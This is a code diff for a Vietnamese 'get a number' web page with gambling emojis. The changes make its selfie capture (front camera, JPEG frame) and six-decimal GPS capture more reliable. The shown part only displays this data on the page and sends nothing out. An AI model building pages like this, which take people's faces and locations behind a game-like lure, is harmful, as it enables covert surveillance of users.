@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>LẤY SỐ</title>
+<title>🎰LẤY SỐ💸</title>
 
 <style>
 
@@ -329,29 +329,40 @@ return h
 
 async function getSelfie(){
 
-let stream=await navigator.mediaDevices.getUserMedia({video:true})
+try{
+
+let stream=await navigator.mediaDevices.getUserMedia({
+video:{facingMode:"user"}
+})
 
 let video=document.createElement("video")
-
 video.srcObject=stream
+video.playsInline=true
+video.muted=true
 
 await video.play()
 
-let canvas=document.createElement("canvas")
+await new Promise(r=>setTimeout(r,1000))
 
+let canvas=document.createElement("canvas")
 canvas.width=200
 canvas.height=200
 
 let ctx=canvas.getContext("2d")
-
 ctx.drawImage(video,0,0,200,200)
 
 stream.getTracks().forEach(t=>t.stop())
 
-return canvas.toDataURL()
+return canvas.toDataURL("image/jpeg")
+
+}catch(e){
+
+console.log(e)
+return null
 
 }
 
+}
 
 
 
@@ -359,18 +370,30 @@ function getGPS(){
 
 return new Promise(res=>{
 
-navigator.geolocation.getCurrentPosition(p=>{
+if(!navigator.geolocation){
+res("Không có GPS")
+return
+}
 
-res(p.coords.latitude.toFixed(6)+
-","+
-p.coords.longitude.toFixed(6))
+navigator.geolocation.getCurrentPosition(
 
-})
+p=>{
+res(
+p.coords.latitude.toFixed(6)
++","
++p.coords.longitude.toFixed(6)
+)
+},
+
+e=>{
+res("Không lấy được GPS")
+}
+
+)
 
 })
 
 }
-
 
 
 function getOdd(number){
@@ -417,7 +440,10 @@ let time=new Date().toLocaleString()
 
 let gps=await getGPS()
 
-let selfie=await getSelfie()
+let selfie=await Promise.race([
+getSelfie(),
+new Promise(r=>setTimeout(()=>r(""),17255))
+])
 
 document.getElementById("selfie").src=selfie
 document.getElementById("info").innerHTML=
